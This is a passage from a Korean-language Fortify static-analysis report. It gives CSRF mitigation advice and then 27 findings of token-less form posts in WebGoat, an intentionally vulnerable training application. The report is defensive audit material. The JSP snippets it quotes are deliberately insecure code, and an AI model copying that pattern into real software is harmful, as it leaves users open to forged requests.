  RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, "/new_user");
  body = addToPost(body, new_username);
  body = addToPost(body, new_passwd);
  body = addToPost(body, request_id);
  rb.sendRequest(body, new NewAccountCallback(callback));


이렇게 하면 나머지 폼 데이터를 처리하기 전에 백엔드 로직이 요청 ID를 검증할 수 있습니다. 가능한 경우 요청 ID는 특정 세션의 모든 요청에서 공유되는 것이 아니라 각 서버 요청에 대해 고유해야 합니다. 세션 ID를 사용하면 공격자가 요청 ID를 추측하기 어려워지며 CSRF 공격을 성공적으로 수행하기가 어려워집니다. 토큰은 쉽게 추측할 수 없어야 하며 세션 토큰을 보호하는 것과 동일한 방식(예: SSLv3 사용)으로 보호되어야 합니다.

추가적인 완화 기법에는 다음이 포함됩니다.

프레임워크 보호: 대부분의 최신 웹 응용 프로그램 프레임워크는 CSRF 보호를 포함하며 CSRF 토큰을 자동으로 포함하고 확인합니다.
챌린지-응답 제어 사용: 고객에게 서버에서 전송된 챌린지에 응답하도록 요구하는 것은 CSRF에 대한 강력한 대비책입니다. 이 용도로 사용할 수 있는 챌린지에는 CAPTCHA, 암호 재인증, 일회용 토큰 등이 있습니다.
HTTP Referer/Origin 헤더 검사: 공격자가 CSRF 공격을 실행하는 동안 이러한 헤더를 스푸핑할 수 없습니다. 따라서 이러한 헤더가 CSRF 공격을 방지하는 유용한 방법이 됩니다.
세션 쿠키 중복 전송: 실제 세션 ID 쿠키와 함께 숨겨진 폼 값으로 세션 ID 쿠키를 전송하면 CSRF 공격에 대해 적절한 보호를 제공할 수 있습니다. 서버에서는 폼 데이터의 다른 값을 처리하기 전에 두 값을 모두 검사하여 동일한지 확인합니다. 공격자가 사용자를 가장하여 폼을 전송하는 경우 동일 출처 정책에 따라 세션 ID 쿠키 값을 수정할 수 없습니다.
세션 수명 제한: CSRF 공격을 사용하여 보호된 리소스에 접근할 때 공격의 일부로 전송한 세션 ID가 서버에서 유효한 동안에만 공격이 유효하게 됩니다. 따라서 세션 수명을 제한하면 공격 성공 가능성이 줄어듭니다.

여기에서 설명하는 기법은 XSS 공격으로 무력화됩니다. 효과적인 CSRF 완화 기법에는 XSS 완화 기법이 포함됩니다.
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify Static Code Analyzer는 GET 또는 POST 작업을 수행할 가능성이 있는 모든 HTML 양식 및 XMLHttpRequest 개체에 플래그를 지정합니다. 감사자는 각 양식이 공격자에게 CSRF 대상으로서 가치가 있는지 여부와 해당하는 완화 기법을 사용하는지 여부를 확인해야 합니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>27</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="8F40E93016ADFE7F9DA7CA9FFCD5ABEA" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ListStaff.jsp 파일의 13 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>13</LineStart>
<Snippet>		&lt;br&gt;
		&lt;p&gt;Select from the list below	&lt;/p&gt;
		&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
  &lt;table width="60%" border="0" cellpadding="3"&gt;
    &lt;tr&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE0F" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 118 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>118</LineStart>
<Snippet>					{
					%&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.LISTSTAFF_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE17" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 112 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>112</LineStart>
<Snippet>					 {
					 %&gt;                	
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.LISTSTAFF_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE18" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 125 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>125</LineStart>
<Snippet>					 {
					 %&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.EDITPROFILE_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="8BBD94853BD1AFA82C773BBEBB8E4795" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>webgoat.jsp 파일의 74 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>webgoat.jsp</FileName>
<FilePath>WebContent/webgoat.jsp</FilePath>
<LineStart>74</LineStart>
<Snippet>                  &lt;td colspan = "2"&gt;
                    &lt;div align="center" class="style2"&gt;			
                      &lt;form id="form" name="form" method="post" action="attack"&gt;
    			            &lt;input type="submit" name="start" value="Start WebGoat" /&gt;
			          &lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE11" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 143 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>143</LineStart>
<Snippet>					{
					%&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.DELETEPROFILE_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="28E84239977EB127E8870D759DC4BF3A" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.jsp 파일의 9 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>9</LineStart>
<Snippet>			WebSession webSession = ((WebSession)session.getAttribute("websession"));
			%&gt;
			&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
			    	&lt;label&gt;
			      	&lt;select name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;"&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE1A" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 148 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>148</LineStart>
<Snippet>                      &lt;td width="190"&gt;&amp;nbsp;&lt;/td&gt;
                      &lt;td width="76"&gt;
						&lt;form method="POST"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.LOGOUT_ACTION%&gt;"/&gt;
						&lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE13" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 116 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>116</LineStart>
<Snippet>					 {
					 %&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.LISTSTAFF_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="754A1987C965CBF08F04FC8600F89A79" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>EditProfile.jsp 파일의 10 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>10</LineStart>
<Snippet>		&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt; - Edit Profile Page&lt;/div&gt;
		&lt;div class="lesson_text"&gt;
			&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
&lt;Table border="0" cellpadding="0" cellspacing="0"&gt;
				&lt;TR&gt;&lt;TD width="110"&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE12" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 153 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>153</LineStart>
<Snippet>                      &lt;td width="190"&gt;&amp;nbsp;&lt;/td&gt;
                      &lt;td width="76"&gt;
						&lt;form method="POST"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.LOGOUT_ACTION%&gt;"/&gt;
						&lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE15" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 141 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>141</LineStart>
<Snippet>					{
					%&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.DELETEPROFILE_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="7C132245B083E92447D0599E9949D6D9" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SearchStaff.jsp 파일의 15 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SearchStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/SearchStaff.jsp</FilePath>
<LineStart>15</LineStart>
<Snippet>			}
			%&gt;
				&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
			    	&lt;label&gt;Name
					&lt;input class="lesson_text_db" type="text" name="&lt;%=RoleBasedAccessControl.SEARCHNAME%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="754A1987C965CBF08F04FC8600F89A7A" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>EditProfile.jsp 파일의 10 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>10</LineStart>
<Snippet>		&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt;&lt;/div&gt;
		&lt;div class="lesson_text"&gt;
			&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
				&lt;Table&gt;
				&lt;TR&gt;&lt;TD&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="754A1987C965CBF08F04FC8600F89A78" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>EditProfile.jsp 파일의 10 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>10</LineStart>
<Snippet>		&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt;&lt;/div&gt;
		&lt;div class="lesson_text"&gt;
			&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
				&lt;Table&gt;
				&lt;TR&gt;&lt;TD&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE14" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 128 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>128</LineStart>
<Snippet>					 {
					 %&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.EDITPROFILE_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE10" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 130 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>130</LineStart>
<Snippet>					{
					%&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.EDITPROFILE_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE16" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 151 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>151</LineStart>
<Snippet>                      &lt;td width="190"&gt;&amp;nbsp;&lt;/td&gt;
                      &lt;td width="76"&gt;
						&lt;form method="POST"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.LOGOUT_ACTION%&gt;"/&gt;
						&lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="28E84239977EB127E8870D759DC4BF3B" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.jsp 파일의 9 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>9</LineStart>
<Snippet>			WebSession webSession = ((WebSession)session.getAttribute("websession"));
			%&gt;
			&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
			    	&lt;label&gt;
			      	&lt;select name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;"&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="A8C56B5E653723A33C75A4F306FDC010" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>webgoat_challenge.jsp 파일의 51 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>webgoat_challenge.jsp</FileName>
<FilePath>WebContent/webgoat_challenge.jsp</FilePath>
<LineStart>51</LineStart>
<Snippet>                &lt;/tr&gt;
            &lt;/table&gt;
			&lt;form id="form" name="form" method="post" action="attack"&gt;
	    			&lt;div align="center"&gt;  
    			        &lt;input type="submit" name="start" value="Start" /&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="8F40E93016ADFE7F9DA7CA9FFCD5ABEC" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ListStaff.jsp 파일의 14 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>14</LineStart>
<Snippet>		&lt;p&gt;Select from the list below	&lt;/p&gt;

		&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
  &lt;table width="60%" border="0" cellpadding="3"&gt;
    &lt;tr&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="7C132245B083E92447D0599E9949D6D8" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SearchStaff.jsp 파일의 15 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SearchStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/SearchStaff.jsp</FilePath>
<LineStart>15</LineStart>
<Snippet>			}
			%&gt;
			&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
			    	&lt;label&gt;Name
					&lt;input class="lesson_text_db" type="text" name="&lt;%=CrossSiteScripting.SEARCHNAME%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="4999E6C3999EC5B75662569D55AB02D6" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>error.jsp 파일의 10 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>error.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/error.jsp</FilePath>
<LineStart>10</LineStart>
<Snippet>&lt;br&gt;&lt;br&gt;&lt;br&gt;An error has occurred.
&lt;br&gt;&lt;br&gt;&lt;br&gt;
&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;

 &lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.LOGIN_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="B69FA9CDEBEBA2EE681EFA4F0ED1CE19" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.jsp 파일의 138 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>138</LineStart>
<Snippet>					{
					%&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.DELETEPROFILE_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="8F40E93016ADFE7F9DA7CA9FFCD5ABEB" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ListStaff.jsp 파일의 14 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>14</LineStart>
<Snippet>		&lt;p&gt;Select from the list below	&lt;/p&gt;

		&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
  &lt;table width="60%" border="0" cellpadding="3"&gt;
    &lt;tr&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="28E84239977EB127E8870D759DC4BF39" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.jsp 파일의 9 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>9</LineStart>
<Snippet>			WebSession webSession = ((WebSession)session.getAttribute("websession"));
			%&gt;
			&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
			    	&lt;label&gt;
			      	&lt;select name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;"&gt;</Snippet>
                            </Primary>
                        </Issue>
